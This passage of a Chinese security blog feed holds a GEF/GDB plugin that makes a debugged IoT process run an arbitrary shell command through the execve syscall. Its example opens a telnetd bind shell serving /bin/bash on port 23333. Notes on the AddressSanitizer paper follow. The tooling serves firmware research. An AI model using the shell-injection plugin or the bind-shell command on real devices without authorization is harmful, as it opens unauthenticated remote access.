    <link href="/2023/06/12/gdb%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E6%8F%92%E4%BB%B6/"/>
    <url>/2023/06/12/gdb%E5%9B%BA%E4%BB%B6%E6%8F%90%E5%8F%96%E6%8F%92%E4%BB%B6/</url>
    
    <content type="html"><![CDATA[<p>修了个小bug，方便提取固件使用</p><a id="more"></a><h1 id="iot类一键获取shell"><a href="#iot类一键获取shell" class="headerlink" title="iot类一键获取shell"></a>iot类一键获取shell</h1><h2 id="gef插件代码"><a href="#gef插件代码" class="headerlink" title="gef插件代码"></a>gef插件代码</h2><p>原作者的插件代码并没有完全公开，缺少了很多，也可能是由于版本适配问题，以下是修改过的最新代码。</p><p>底层原理见参考资料，使用时注意吧断点全部清除。如果gef用不习惯可以移植pwndbg，只需要更改gdbinit即可</p><figure class="highlight gradle"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs gradle"><span class="hljs-keyword">source</span> <span class="hljs-regexp">/home/</span>pisanbao<span class="hljs-regexp">/pwndbg/g</span>dbinit.py<br><span class="hljs-keyword">source</span> ~/gef.py<br></code></pre></td></tr></table></figure><p>这样就能在gef中使用一些pwndbg定义的命令了后面在source一下插件代码正常使用即可，其中patterns found可能会出现小bug在只找到一个pattern的时候就不是patterns是pattern</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">ExecveCommand</span>(<span class="hljs-params">GenericCommand</span>):</span><br>    <span class="hljs-string">&quot;&quot;&quot;use execve do anything cmd&quot;&quot;&quot;</span><br>    _cmdline_ = <span class="hljs-string">&quot;execve&quot;</span><br>    _syntax_  = <span class="hljs-string">&quot;&#123;:s&#125; [cmd]|set addr [address]&quot;</span>.<span class="hljs-built_in">format</span>(_cmdline_)<br>    _example_ = <span class="hljs-string">&quot;&#123;:s&#125; /usr/sbin/telnetd -l /bin/bash -p 23333\n&#123;:s&#125; set addr 0x7fb4360748ae&quot;</span>.<span class="hljs-built_in">format</span>(_cmdline_, _cmdline_)<br><br>    _aliases_ = [<span class="hljs-string">&quot;exec&quot;</span>,]<br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">__init__</span>(<span class="hljs-params">self</span>):</span><br>        <span class="hljs-built_in">super</span>().__init__(complete=gdb.COMPLETE_FILENAME)<br>        self.findAddr = <span class="hljs-literal">None</span><br>        <span class="hljs-keyword">return</span><br><br><span class="hljs-meta">    @only_if_gdb_running</span><br>    <span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">do_invoke</span>(<span class="hljs-params">self, argv</span>):</span><br>        <span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">        mips/arm todo</span><br><span class="hljs-string">        &#x27;&#x27;&#x27;</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(argv) &gt; <span class="hljs-number">0</span>:<br>            <span class="hljs-keyword">if</span> argv[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;debug&quot;</span>:<br>                <span class="hljs-comment"># debug = 1</span><br>                dofunc = <span class="hljs-built_in">print</span><br>                argv = argv[<span class="hljs-number">1</span>:]<br>            <span class="hljs-keyword">elif</span> argv[<span class="hljs-number">0</span>] == <span class="hljs-string">&quot;set&quot;</span>:<br>                <span class="hljs-keyword">if</span> argv[<span class="hljs-number">1</span>] == <span class="hljs-string">&quot;addr&quot;</span>:<br>                    self.findAddr = <span class="hljs-built_in">int</span>(argv[<span class="hljs-number">2</span>], <span class="hljs-number">16</span>)<br>                    info(<span class="hljs-string">&quot;set success&quot;</span>)<br>                <span class="hljs-keyword">return</span><br>            <span class="hljs-keyword">else</span>:<br>                <span class="hljs-comment"># debug = 0</span><br>                dofunc = gdb.execute<br>        <span class="hljs-keyword">else</span>:<br>            err(<span class="hljs-string">&quot;The lack of argv.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        cmd = <span class="hljs-string">&quot; &quot;</span>.join(argv)<br>        cmd = [<span class="hljs-string">b&quot;/bin/sh&quot;</span>, <span class="hljs-string">b&quot;-c&quot;</span>, cmd.encode()]<br>        current_arch = gef.arch<br>        <span class="hljs-comment"># print(current_arch.sp)</span><br>        <span class="hljs-comment"># print(current_arch.pc)</span><br>        <span class="hljs-comment"># print(current_arch.ptrsize)</span><br>        <span class="hljs-comment"># print(endian_str())</span><br>        <span class="hljs-comment"># print(current_arch.syscall_instructions)</span><br>        <span class="hljs-comment"># print(current_arch.syscall_register)</span><br>        <span class="hljs-comment"># print(current_arch.special_registers)</span><br>        <span class="hljs-comment"># print(current_arch.function_parameters)</span><br>        <span class="hljs-comment"># print(current_arch.arch)</span><br>        <span class="hljs-comment"># print(current_arch.get_ith_parameter)</span><br>        <span class="hljs-comment"># print(current_arch.gpr_registers)</span><br>        <span class="hljs-comment"># print(current_arch.get_ra)</span><br>        <span class="hljs-comment"># write_memory</span><br>        <br>        inferior = gdb.selected_inferior()<br>        write_memory = inferior.write_memory<br><br>        <span class="hljs-keyword">try</span>:<br>            rsp = current_arch.sp<br>            nowpc = self.findAddr <span class="hljs-keyword">or</span> current_arch.pc<br>        <span class="hljs-keyword">except</span> gdb.error <span class="hljs-keyword">as</span> e:<br>            err(<span class="hljs-string">&quot;%s Please start first.&quot;</span>%e)<br>            <span class="hljs-keyword">return</span><br>        bit = current_arch.ptrsize<br>        print(<span class="hljs-string">f&quot;current_arch.ptrsize=<span class="hljs-subst">&#123;current_arch.ptrsize&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> current_arch.arch == <span class="hljs-string">&quot;X86&quot;</span>:<br>            arg0 = <span class="hljs-string">&quot;$rdi&quot;</span> <span class="hljs-keyword">if</span> bit == <span class="hljs-number">8</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;$ebx&quot;</span><br>            arg1 = <span class="hljs-string">&quot;$rsi&quot;</span> <span class="hljs-keyword">if</span> bit == <span class="hljs-number">8</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;$ecx&quot;</span><br>            arg2 = <span class="hljs-string">&quot;$rdx&quot;</span> <span class="hljs-keyword">if</span> bit == <span class="hljs-number">8</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;$edx&quot;</span><br>            sysreg = current_arch.syscall_register<br>            sysreg_value = <span class="hljs-number">59</span> <span class="hljs-keyword">if</span> bit == <span class="hljs-number">8</span> <span class="hljs-keyword">else</span> <span class="hljs-number">11</span><br>            syscall_instr = <span class="hljs-number">0x050F</span> <span class="hljs-keyword">if</span> bit == <span class="hljs-number">8</span> <span class="hljs-keyword">else</span> <span class="hljs-number">0x80CD</span><br>        <span class="hljs-keyword">else</span>:<br>            err(<span class="hljs-string">&quot;%s can&#x27;t implementation.&quot;</span> % current_arch.arch)<br>            <span class="hljs-keyword">return</span><br>        spc = nowpc &amp; (~<span class="hljs-number">0xFFF</span>)<br>        res = gdb.execute(<span class="hljs-string">&quot;find /h %s,%s,%s&quot;</span>%(spc, spc+<span class="hljs-number">0x10000</span>, syscall_instr), to_string=<span class="hljs-literal">True</span>)<br>        print(<span class="hljs-string">f&quot;syscall addr=<span class="hljs-subst">&#123;res&#125;</span>&quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&quot;patterns found.&quot;</span> <span class="hljs-keyword">not</span> <span class="hljs-keyword">in</span> res:<br>            err(<span class="hljs-string">&quot;can&#x27;t find syscall. Please break in libc.&quot;</span>)<br>            <span class="hljs-keyword">return</span><br>        newpc = res.splitlines()[<span class="hljs-number">0</span>].split(<span class="hljs-string">&#x27; &#x27;</span>)[<span class="hljs-number">0</span>]<br>        print(<span class="hljs-string">f&quot;newpc addr=<span class="hljs-subst">&#123;newpc&#125;</span>&quot;</span>)<br>        endian_symbol = endian_str()<br>        endian = <span class="hljs-string">&quot;little&quot;</span> <span class="hljs-keyword">if</span> endian_symbol == <span class="hljs-string">&quot;&lt;&quot;</span> <span class="hljs-keyword">else</span> <span class="hljs-string">&quot;big&quot;</span><br>        print(<span class="hljs-string">f&quot;endian_symbol=<span class="hljs-subst">&#123;endian_symbol&#125;</span>&quot;</span>)<br>        startaddr = rsp + <span class="hljs-number">0x100</span><br>        args_list = []<br>        <span class="hljs-comment"># cmd write to stack</span><br>        <span class="hljs-keyword">for</span> cstr <span class="hljs-keyword">in</span> cmd:<br>            args_list.append(startaddr)<br>            cstr += <span class="hljs-string">b&quot;\x00&quot;</span> * (<span class="hljs-number">4</span> - (<span class="hljs-built_in">len</span>(cstr) % <span class="hljs-number">4</span>))<br>            length = <span class="hljs-built_in">len</span>(cstr)<br>            <span class="hljs-comment">#print(f&quot;i am here~~~&#123;cstr&#125;&quot;)</span><br>            write_memory(startaddr, cstr, length)<br>            startaddr += length<br>            <span class="hljs-comment"># for i in range(0, len(cstr), 4):</span><br>            <span class="hljs-comment">#     t = hex(struct.unpack(endian_symbol+&#x27;I&#x27;, cstr[i:i+4])[0])</span><br>            <span class="hljs-comment">#     dofunc(&quot;set  *(%s)=%s&quot;%(hex(startaddr), t))</span><br>                <span class="hljs-comment"># startaddr += 4</span><br>        args_list.append(<span class="hljs-number">0</span>)<br>        <span class="hljs-comment"># set cmd point (rsi)</span><br>        rsiAddr = rsp + <span class="hljs-number">0x50</span><br>        addrvalue = <span class="hljs-string">b&quot;&quot;</span><br>        <span class="hljs-keyword">for</span> addr <span class="hljs-keyword">in</span> args_list:<br>            addrvalue += addr.to_bytes(bit, endian)<br><br>        write_memory(rsiAddr, addrvalue, <span class="hljs-built_in">len</span>(addrvalue))<br>            <span class="hljs-comment"># for i in range(0, len(addr), 4):</span><br>            <span class="hljs-comment">#     t = hex(struct.unpack(endian_symbol+&#x27;I&#x27;, addr[i:i+4])[0])</span><br>            <span class="hljs-comment">#     dofunc(&quot;set  *(%s+%d)=%s&quot;%(hex(rsiAddr), i, t))</span><br>            <span class="hljs-comment"># rsiAddr += bit</span><br><br>        <span class="hljs-comment"># set first arguments.</span><br>        dofunc(<span class="hljs-string">&quot;set %s=%s&quot;</span>%(arg0, <span class="hljs-built_in">hex</span>(args_list[<span class="hljs-number">0</span>])))<br>        <span class="hljs-comment"># set second arguments</span><br>        dofunc(<span class="hljs-string">&quot;set %s=%s&quot;</span>%(arg1, <span class="hljs-built_in">hex</span>(rsp + <span class="hljs-number">0x50</span>)))<br>        <span class="hljs-comment"># set third arguments</span><br>        dofunc(<span class="hljs-string">&quot;set %s=0&quot;</span>%arg2)<br>        <span class="hljs-comment"># set syscall register</span><br>        print(<span class="hljs-string">f&quot;i am here now~~~&quot;</span>)<br>        dofunc(<span class="hljs-string">&quot;set %s=%s&quot;</span>%(sysreg, sysreg_value))<br>        <span class="hljs-comment"># set $pc=$sp</span><br>        print(<span class="hljs-string">f&quot;i am here~~~<span class="hljs-subst">&#123;newpc&#125;</span>&quot;</span>)<br>        dofunc(<span class="hljs-string">&quot;set $pc=%s&quot;</span>%newpc)<br>        print(<span class="hljs-string">f&quot;i am here~~~&quot;</span>)<br>        <span class="hljs-comment"># set *$pc</span><br>        <span class="hljs-comment"># dofunc(&quot;set *(int *)$pc=%s&quot;%hex(syscall_instr))</span><br>        <span class="hljs-comment"># show context</span><br>        <span class="hljs-comment"># dofunc(&quot;context&quot;)</span><br>        <span class="hljs-comment"># continue</span><br>        dofunc(<span class="hljs-string">&quot;c&quot;</span>)<br>        <span class="hljs-keyword">return</span><br>        <br>register_external_command(ExecveCommand())<br></code></pre></td></tr></table></figure><p>最终效果如下，注意调试时要gdb aaa，aaa是vmlinuz转换成的文件</p><p>可以使用vmlinux-to-elf或者extract-vmlinux或者binwalk强行提取</p><p><img src="image-20230526193258763.png" alt="image-20230526193258763"></p><h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><p><a href="https://paper.seebug.org/1660/">https://paper.seebug.org/1660/</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title>asan论文阅读</title>
    <link href="/2023/05/22/asan%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/"/>
    <url>/2023/05/22/asan%E8%AE%BA%E6%96%87%E9%98%85%E8%AF%BB/</url>
    
    <content type="html"><![CDATA[<p>太久没更新博客了，把之前学习的一些笔记上传一波</p><a id="more"></a><h1 id="ASAN"><a href="#ASAN" class="headerlink" title="ASAN"></a>ASAN</h1><h2 id="Introduction"><a href="#Introduction" class="headerlink" title="Introduction"></a>Introduction</h2><p>针对内存破坏检测，市场上有各类工具，这些工具在速度，内存消耗，检测bug的范围上，报错率，支持的平台和其他特性上各不相同。有些工具支持检测很广的漏洞类型范围但是开销很大。asan在两者上平衡的很好，asan由两部分组成，检测模块和运行时模块，检测模块修改代码用于在内存使用时检测状态，并在栈和全局变量周围创建poisoned red zones用于检测越界。目前这些实现都是基于LLVM编译器的。运行时库的功能是负责替换用于分配释放内存相关的函数的(malloc free).用于在分配的内存周围分配 poisoned red zones。延迟被释放的内存的二次使用。并负责报错。</p><h2 id="Related-Work"><a href="#Related-Work" class="headerlink" title="Related Work"></a>Related Work</h2><p>使用shadow memory用于存储应用相关信息，应用程序的内存被映射到shadow memory用于存储对应内存的信息。有通过多级表查询的方法映射到shadow memory，也有直接映射的。直接映射的最典型代表是TaintTrace和LIFT。TT内存消耗是1：1这也导致了许多程序在原本其内存的1/2内存限制下无法正常运行，LIFT的内存消耗是1/8.</p><p>另一些工具使用的多级地址转换的方法，如Valgrind和Dr.Memory把他们的shadow memory分成了多级并用一个表来查询这些shadow address，这需要额外的内存。</p><p>还有一些通过管理分配内存方式来检测内存漏洞，各自都存在缺陷。</p><h2 id="AddressSanitizer-Algorithm"><a href="#AddressSanitizer-Algorithm" class="headerlink" title="AddressSanitizer Algorithm"></a>AddressSanitizer Algorithm</h2><p>类似Valgrind，基于shadow memory但是更加高效。</p><h3 id="shadow-memory"><a href="#shadow-memory" class="headerlink" title="shadow memory"></a>shadow memory</h3><p>由于内存分配都按照8字节对齐，所以每个对齐的8字节内存都有9种状态即前0-8字节可访问。这些可以由一个字节来表示。</p><p>基于此asan需要源程序1/8内存空间来存放shadow memory。shadow bytes地址的计算方式如下</p><p><code>(Addr&gt;&gt;3)+Offset</code></p><p>关于offset的选取取决于应用程序所占用的内存大小且是动态的。内存从<code>Offset</code>到<code>Offset+Max/8</code>必须在程序启动时没有被占用。一般情况下linux中32位程序选用offset 0x20000000，64位程序中选用offset 0x0000100000000000。在某些开启地址随机化的情况选用0地址。这样也能精简指令集。</p><p>对于shadow byte。0表示全部可访问，1-7表示前x字节可访问，负数表示无法访问。asan使用不同的负数来表示不同种类的不可访问内存，如(heap redzones, stack redzones, global redzones, freed memory)</p><h3 id="Instrumentation"><a href="#Instrumentation" class="headerlink" title="Instrumentation"></a>Instrumentation</h3><p>检测逻辑，当触及8字节的内存时，asan会计算其对应的shadow bytes判断是否为0，不为0则直接报错</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ShadowAddr</span> = (Addr &gt;&gt; 3) + Offset;<br><span class="hljs-attribute">if</span> <span class="hljs-comment">(*ShadowAddr != 0)</span><br><span class="hljs-comment">ReportAndCrash(Addr);</span><br></code></pre></td></tr></table></figure><p>当触及1-7字节内存时算法类似</p><figure class="highlight lisp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs lisp">ShadowAddr = (<span class="hljs-name">Addr</span> &gt;&gt; <span class="hljs-number">3</span>) + Offset<span class="hljs-comment">;</span><br>k = *ShadowAddr<span class="hljs-comment">;</span><br>if (<span class="hljs-name">k</span> != <span class="hljs-number">0</span> <span class="hljs-symbol">&amp;&amp;</span> ((<span class="hljs-name">Addr</span> &amp; <span class="hljs-number">7</span>) + AccessSize &gt; k))<br>ReportAndCrash(<span class="hljs-name">Addr</span>)<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>此处Addr &amp; 7主要是因为内存对齐，如果直接AccessSize &gt; k会忽略一种情况，从内存偏移x处开始读取size字节的情况。</p><p>asan的检测逻辑代码会被部署在llvm的最后阶段，因为优化会删除部分代码，放在最后阶段可以使得只有最终的代码才会被进行检测，提示性能。优化过程会减少代码的冗余操作，如果没放在最后阶段部分代码被优化而asan代码保留这样可能会引起误报，llvm自身也会有一些检测，asan不会对这类代码进行检测，默认其安全。</p><p>报错函数ReportAndCrash最多运行一次，但是他在代码各处都部署，所以还有很多的优化空间，目前是通过简单的函数调用来实现，另一个选择是使用硬件中断。</p><h3 id="Run-time-Library"><a href="#Run-time-Library" class="headerlink" title="Run-time Library"></a>Run-time Library</h3><p>运行时库的主要功能是管理shadow memory，在应用程序启动时整个shadow区域都会被映射，在linux上shadow区域在程序启动时总是不被占用的所以每次都会成功。在MacOS上需要把地址随机化关闭。目前shadow memory机制在windows上也适用。</p><p>malloc和free函数会被替换，malloc会在返回地址周围分配额外的内存即redzone，这些区域会被标记为不可访问即poisoned。redzone区域的大小决定了能检测溢出范围的大小。</p><p>内存区域的布局类似与一系列的freelist，每一个区域左右都有个redzone，n个区域会有n+1个redzone。</p><p>左侧redzone用于存储分配相关的信息如大小和线程id，redzone的最小大小是32字节。当free触发时会把整个内存区域放入隔离区quarantine以防止短时间内的重用，用于检测uaf。目前quarantine的策略是FIFO会拖延固定数量的内存一段时间。</p><p>默认情况下malloc和free的调用栈会记录用于提供详细的错误报告，malloc的调用栈会被记录在左侧redzone(redzone越大能记录的调用栈越大)，free的会被记录在右侧即开头区域，因为左redzone也是另一个regime的右redzone。</p><h3 id="Stack-And-Globals"><a href="#Stack-And-Globals" class="headerlink" title="Stack And Globals"></a>Stack And Globals</h3><p>对于全局变量，在编译期间redzone就会被创建在全局变量周围并在程序启动时将地址发送给运行时库。运行时库会记录此类信息用于后续的报错处理。</p><p>对于栈上对象，redzones会目前是按照32字节对齐，案例如下。</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs d"><span class="hljs-keyword">void</span> foo() &#123;<br><span class="hljs-built_in">char</span> a[<span class="hljs-number">10</span>];<br>&lt;<span class="hljs-built_in">function</span> <span class="hljs-keyword">body</span>&gt; &#125;<br></code></pre></td></tr></table></figure><p>如上函数会被转换成如下状态</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-function"><span class="hljs-keyword">void</span> <span class="hljs-title">foo</span><span class="hljs-params">()</span> </span>&#123;<br><span class="hljs-keyword">char</span> rz1[<span class="hljs-number">32</span>]<br><span class="hljs-keyword">char</span> arr[<span class="hljs-number">10</span>];<br><span class="hljs-keyword">char</span> rz2[<span class="hljs-number">32</span><span class="hljs-number">-10</span>+<span class="hljs-number">32</span>];<br><span class="hljs-keyword">unsigned</span> *shadow =<br>(<span class="hljs-keyword">unsigned</span>*)(((<span class="hljs-keyword">long</span>)rz1&gt;&gt;<span class="hljs-number">8</span>)+Offset);<br><span class="hljs-comment">// poison the redzones around arr.</span><br>shadow[<span class="hljs-number">0</span>] = <span class="hljs-number">0xffffffff</span>; <span class="hljs-comment">// rz1</span><br>shadow[<span class="hljs-number">1</span>] = <span class="hljs-number">0xffff0200</span>; <span class="hljs-comment">// arr and rz2</span><br>shadow[<span class="hljs-number">2</span>] = <span class="hljs-number">0xffffffff</span>; <span class="hljs-comment">// rz2</span><br>&lt;function body&gt;<br><span class="hljs-comment">// un-poison all.</span><br>shadow[<span class="hljs-number">0</span>] = shadow[<span class="hljs-number">1</span>] = shadow[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>; &#125;<br></code></pre></td></tr></table></figure><p>很好理解<code>shadow[1] = 0xffff0200; </code>是主要的用于标记的shadow byte，最低字节0表示前8字节都可访问，第二个是02表示前2字节可访问，对应了arr的大小10。</p><h3 id="False-Negatives"><a href="#False-Negatives" class="headerlink" title="False Negatives"></a>False Negatives</h3><p>上述的检测方法还是会漏掉一些罕见的bug，案例如下</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-type">int</span> *a = <span class="hljs-built_in">new</span> <span class="hljs-type">int</span>[<span class="hljs-number">2</span>]; // <span class="hljs-number">8</span>-aligned<br><span class="hljs-type">int</span> *u = (<span class="hljs-type">int</span>*)((<span class="hljs-type">char</span>*)a + <span class="hljs-number">6</span>);<br>*u = <span class="hljs-number">1</span>; // <span class="hljs-keyword">Access</span> <span class="hljs-keyword">to</span> range [<span class="hljs-number">6</span><span class="hljs-number">-9</span>]<br></code></pre></td></tr></table></figure><p>此处的问题是u所访问到的内存越界了，由于a是8字节对齐的采用第一种检测方式</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">ShadowAddr</span> = (Addr &gt;&gt; 3) + Offset;<br><span class="hljs-attribute">if</span> <span class="hljs-comment">(*ShadowAddr != 0)</span><br><span class="hljs-comment">ReportAndCrash(Addr);</span><br></code></pre></td></tr></table></figure><p>按照此种 非对其内存的部分越界访问 asan选择直接忽略，因为目前所能想出的检测逻辑对性能都有不小的影响。</p><p>1.使用运行时检测地址是对齐</p><p>2.使用单字节映射方式</p><p>3.使用更复杂的内存映射来减少忽略该类漏洞的几率</p><p>如下的一些问题也会被asan忽略，诸如 Valgrind or Dr. Memory的工具同样也存在问题即过远距离的内存越界访问</p><figure class="highlight arduino"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs arduino"><span class="hljs-keyword">char</span> *a = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">100</span>];<br><span class="hljs-keyword">char</span> *b = <span class="hljs-keyword">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1000</span>];<br>a[<span class="hljs-number">500</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">// may end up somewhere in b</span><br></code></pre></td></tr></table></figure><p>另外一些uaf也不一定会被检测到</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver"><span class="hljs-keyword">char</span> *<span class="hljs-keyword">a</span> = <span class="hljs-built_in">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>];<span class="hljs-comment"> // 1MB</span><br><span class="hljs-built_in">delete</span> [] <span class="hljs-keyword">a</span>;<span class="hljs-comment"> // &lt;&lt;&lt; &quot;free&quot;</span><br><span class="hljs-keyword">char</span> *b = <span class="hljs-built_in">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">28</span>];<span class="hljs-comment"> // 256MB</span><br><span class="hljs-built_in">delete</span> [] b;<span class="hljs-comment"> // drains the quarantine queue.</span><br><span class="hljs-keyword">char</span> *c = <span class="hljs-built_in">new</span> <span class="hljs-keyword">char</span>[<span class="hljs-number">1</span> &lt;&lt; <span class="hljs-number">20</span>];<span class="hljs-comment"> // 1MB</span><br><span class="hljs-keyword">a</span>[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>;<span class="hljs-comment"> // &quot;use&quot;. May land in ’c’.</span><br></code></pre></td></tr></table></figure><p>这种成因主要还是因为asan检测uaf漏洞的实现，是通过隔离区quarantine queue。释放后的内存不会立刻放入free list而是放入quarantine queue。这个队列如果被占满导致内存出去然后c的分配可能使用的是a内存，此时再次进行use就无法检测了。</p><h3 id="False-Positives"><a href="#False-Positives" class="headerlink" title="False Positives"></a>False Positives</h3><p>整体来说没有存在误报的情况，但是在开发和部署的过程中有遇到，作者在此处讲解了几个案例</p><h4 id="Conflict-With-Load-Widening"><a href="#Conflict-With-Load-Widening" class="headerlink" title="Conflict With Load Widening"></a>Conflict With Load Widening</h4><p>即编译器的扩展优化</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs llvm">struct X &#123; char a<span class="hljs-punctuation">,</span> b<span class="hljs-punctuation">,</span> <span class="hljs-keyword">c</span><span class="hljs-comment">; &#125;;</span><br>void foo() &#123;<br>X <span class="hljs-keyword">x</span><span class="hljs-comment">; ...</span><br>... <span class="hljs-operator">=</span> <span class="hljs-keyword">x</span>.a + <span class="hljs-keyword">x</span>.<span class="hljs-keyword">c</span><span class="hljs-comment">; &#125;</span><br></code></pre></td></tr></table></figure><p>x结构体三字节但是在内存中还是按照4字节对其的，再取a和c的时候编译器可能会进行优化直接取一个dword。这样asan会以为是越界。为了避免该问题asan启用时llvm会禁用扩展优化。</p><h4 id="Conflict-With-Clone"><a href="#Conflict-With-Clone" class="headerlink" title="Conflict With Clone"></a>Conflict With Clone</h4><p>这类问题存在于父子进程中，父进程创建子进程时带上CLONE VM|CLONE FILES标记会共享内存，假如子进程在栈上创建对象并且返回时选择了调用一些永不返回的函数入exit就会导致栈上的redzone没有被恢复，此时会影响到父进程，父进程在触及这些区域时就会触发误报，解决方案是针对一些exit exec类的函数进行检测，触发则取消先前的redzone标记。类似的针对长跳转和异常处理也要采取unpoisoned操作。</p><h4 id="Intentional-Wild-Dereferences"><a href="#Intentional-Wild-Dereferences" class="headerlink" title="Intentional Wild Dereferences"></a>Intentional Wild Dereferences</h4><p>这里涉及到部分代码中有意实现越界读写，该类情况很少遇到，可以在代码中添加宏no_address_safety_analysis来使得asan忽略该类情况，整个chromium代码中只有用到一次。</p><h3 id="Threads"><a href="#Threads" class="headerlink" title="Threads"></a>Threads</h3><p>asan整体是线程安全的。shadow memory只有在内存不可被访问时才会被修改(在malloc free调用期间或在栈帧的创建和销毁期间模块初始化期间)。其他情况下的针对shadow memory操作都是读写。malloc和free使用thread-local caches来避免经常性使用锁。如果源程序在数据free和数据访问期间存在条件竞争那么asan可能会识别成uaf。线程的id在每次malloc和free期间都被记录且在错误报告中会体现。</p><h2 id="Evaluation"><a 